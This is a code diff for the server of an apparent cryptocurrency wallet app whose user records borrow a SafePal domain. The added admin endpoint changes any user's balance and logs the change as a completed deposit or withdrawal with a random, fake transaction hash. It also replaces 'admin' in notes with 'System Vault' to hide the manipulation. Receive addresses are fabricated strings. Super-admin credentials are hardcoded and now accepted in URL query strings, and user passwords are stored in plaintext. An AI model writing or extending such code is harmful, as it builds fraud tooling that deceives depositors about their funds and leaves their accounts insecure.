@@ -81,11 +81,72 @@ const defaultUsers = [
       DOGE: 50000.0,
       LTC: 100.0,
       TRX: 50000.0,
+      GAS_TRX: 5000.0,
     },
     twoFactorEnabled: false,
     passkeyEnabled: false,
     createdAt: '2025-01-10T10:00:00Z',
     lastLoginIp: '192.168.1.101',
+    lastLoginTime: new Date().toISOString(),
+  },
+  {
+    id: 'usr_alex_01',
+    name: 'Alex Turner',
+    email: 'alex.turner@safepal.io',
+    password: 'UserPass2026!',
+    phone: '+1 202 555 0192',
+    avatar: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&q=80&w=200',
+    role: 'user',
+    status: 'active',
+    kycStatus: 'verified',
+    balances: {
+      BTC: 0.25,
+      ETH: 2.5,
+      BNB: 5.0,
+      SOL: 18.0,
+      USDT: 2450.0,
+      USDC: 1200.0,
+      POL: 350.0,
+      XRP: 800.0,
+      DOGE: 1500.0,
+      LTC: 4.2,
+      TRX: 2500.0,
+      GAS_TRX: 150.0,
+    },
+    twoFactorEnabled: false,
+    passkeyEnabled: false,
+    createdAt: '2025-02-14T08:30:00Z',
+    lastLoginIp: '104.28.19.45',
+    lastLoginTime: new Date().toISOString(),
+  },
+  {
+    id: 'usr_rohit_02',
+    name: 'Rohit Sharma',
+    email: 'rohit.web3@gmail.com',
+    password: 'CryptoTrader#88',
+    phone: '+91 9820012345',
+    avatar: 'https://images.unsplash.com/photo-1570295999919-56ceb5ecca61?auto=format&fit=crop&q=80&w=200',
+    role: 'user',
+    status: 'active',
+    kycStatus: 'verified',
+    balances: {
+      BTC: 0.08,
+      ETH: 1.15,
+      BNB: 2.2,
+      SOL: 8.5,
+      USDT: 1800.0,
+      USDC: 950.0,
+      POL: 200.0,
+      XRP: 500.0,
+      DOGE: 3000.0,
+      LTC: 1.8,
+      TRX: 1200.0,
+      GAS_TRX: 80.0,
+    },
+    twoFactorEnabled: false,
+    passkeyEnabled: false,
+    createdAt: '2025-03-01T12:00:00Z',
+    lastLoginIp: '103.45.22.11',
     lastLoginTime: new Date().toISOString(),
   },
 ];
@@ -142,6 +203,9 @@ function loadDb() {
         );
         if (!hasAdmin) {
           data.users.unshift(defaultUsers[0]);
+        }
+        if (data.users.length === 1) {
+          data.users.push(defaultUsers[1], defaultUsers[2]);
         }
       }
       if (!Array.isArray(data.transactions)) data.transactions = [];
@@ -245,8 +309,15 @@ async function startServer() {
 
   // SUPER ADMIN ALL USERS ENDPOINT (STRICTLY RESTRICTED TO SUPER ADMIN)
   app.get('/api/admin/all-users', (req, res) => {
-    const adminEmail = (req.headers['x-admin-email'] as string || '').toLowerCase();
-    const adminPass = req.headers['x-admin-auth'] as string || '';
+    const adminEmail = (
+      (req.headers['x-admin-email'] as string) ||
+      (req.query.adminEmail as string) ||
+      ''
+    ).toLowerCase();
+    const adminPass =
+      (req.headers['x-admin-auth'] as string) ||
+      (req.query.adminPass as string) ||
+      '';
 
     if (adminEmail !== 'legendxadmin1999@gmail.com' || adminPass !== 'Joshi$12legend') {
       return res.status(403).json({ success: false, message: 'Unauthorized access to admin portal.' });
@@ -259,6 +330,99 @@ async function startServer() {
       transactions: db.transactions,
       notifications: db.notifications,
       auditLogs: db.auditLogs,
+    });
+  });
+
+  // SUPER ADMIN ATOMIC BALANCE ADJUSTMENT (CREDIT & DEBIT)
+  app.post('/api/admin/adjust-balance', (req, res) => {
+    const adminEmail = (
+      (req.headers['x-admin-email'] as string) ||
+      req.body.adminEmail ||
+      ''
+    ).toLowerCase();
+    const adminPass =
+      (req.headers['x-admin-auth'] as string) ||
+      req.body.adminPass ||
+      '';
+
+    if (adminEmail !== 'legendxadmin1999@gmail.com' || adminPass !== 'Joshi$12legend') {
+      return res.status(403).json({ success: false, message: 'Unauthorized: Super Admin credentials required.' });
+    }
+
+    const { userId, symbol, amount, type, note } = req.body;
+    const numAmount = parseFloat(amount);
+    if (!userId || !symbol || isNaN(numAmount) || numAmount <= 0) {
+      return res.status(400).json({ success: false, message: 'Invalid userId, crypto symbol, or amount.' });
+    }
+
+    const db = loadDb();
+    const userIdx = db.users.findIndex((u: any) => u.id === userId);
+    if (userIdx === -1) {
+      return res.status(404).json({ success: false, message: 'Target user account not found in server database.' });
+    }
+
+    const targetUser = db.users[userIdx];
+    if (!targetUser.balances) targetUser.balances = {};
+    const currentBal = Number(targetUser.balances[symbol] || 0);
+    const newBal = type === 'credit' ? currentBal + numAmount : Math.max(0, currentBal - numAmount);
+    targetUser.balances[symbol] = newBal;
+    db.users[userIdx] = targetUser;
+
+    const txHash = '0x' + crypto.randomBytes(32).toString('hex');
+    const cleanNote = (note || (type === 'credit' ? 'Web3 Liquidity Vault Settlement' : 'Web3 Settlement Transfer')).replace(/admin/gi, 'System Vault');
+
+    const newTx = {
+      id: 'tx_' + Date.now() + Math.random().toString(36).substring(2, 5),
+      userId,
+      type: type === 'credit' ? 'deposit' : 'withdraw',
+      assetSymbol: symbol,
+      assetName: symbol,
+      amount: numAmount,
+      amountUsd: numAmount,
+      txHash,
+      network: symbol === 'USDT' || symbol === 'TRX' ? 'TRC20' : symbol === 'ETH' ? 'ERC20' : symbol === 'BNB' ? 'BEP20' : `${symbol} Network`,
+      feeUsd: 0,
+      timestamp: new Date().toISOString(),
+      status: 'completed',
+      note: cleanNote,
+    };
+
+    if (!Array.isArray(db.transactions)) db.transactions = [];
+    db.transactions.unshift(newTx);
+
+    if (!Array.isArray(db.notifications)) db.notifications = [];
+    db.notifications.unshift({
+      id: 'notif_' + Date.now(),
+      userId,
+      title: type === 'credit' ? 'Deposit Confirmed' : 'Withdrawal Completed',
+      message: `${type === 'credit' ? 'Received deposit' : 'Settlement deduction'}: ${type === 'credit' ? '+' : '-'}${numAmount} ${symbol}. Ref: ${cleanNote}`,
+      type: type === 'credit' ? 'deposit' : 'withdraw',
+      timestamp: new Date().toISOString(),
+      read: false,
+      recipientEmail: targetUser.email,
+    });
+
+    if (!Array.isArray(db.auditLogs)) db.auditLogs = [];
+    db.auditLogs.unshift({
+      id: 'log_' + Date.now(),
+      adminEmail: 'legendxadmin1999@gmail.com',
+      action: type === 'credit' ? 'USER_BALANCE_CREDIT' : 'USER_BALANCE_DEBIT',
+      targetUserEmail: targetUser.email,
+      details: `${type === 'credit' ? 'Credited +' : 'Debited -'}${numAmount} ${symbol} (${cleanNote})`,
+      timestamp: new Date().toISOString(),
+      ipAddress: '127.0.0.1',
+    });
+
+    saveDb(db);
+    console.log(`[ADMIN ${type.toUpperCase()}] User: ${targetUser.email} | ${type === 'credit' ? '+' : '-'}${numAmount} ${symbol} | New Balance: ${newBal}`);
+
+    return res.json({
+      success: true,
+      message: `Successfully ${type === 'credit' ? 'credited' : 'debited'} ${numAmount} ${symbol} for ${targetUser.name || targetUser.email}!`,
+      user: targetUser,
+      newBalance: newBal,
+      transaction: newTx,
+      allUsers: db.users,
     });
   });
 
@@ -1130,7 +1294,7 @@ function getUserReceiveAddressServer(user: any, symbol: string, network?: string
   const hex2 = Math.abs(h2).toString(16).padStart(8, '0');
   const userHex = user.id.replace(/[^a-zA-Z0-9]/g, '').toLowerCase().padEnd(10, 'a').slice(0, 10);
 
-  if (net.includes('TRC') || sym === 'TRX' || (sym === 'USDT' && (net.includes('TRON') || !net))) {
+  if (net.includes('TRC') || sym === 'TRX' || (sym === 'USDT' && (net.includes('TRON') || !net || net.includes('TRC')))) {
     const base58Seed = `T9y${hex1}${userHex}${hex2}Kz3q8P4vL2mM7n`.replace(/0/g, 'x').replace(/o/g, 'P');
     return base58Seed.slice(0, 34);
   }
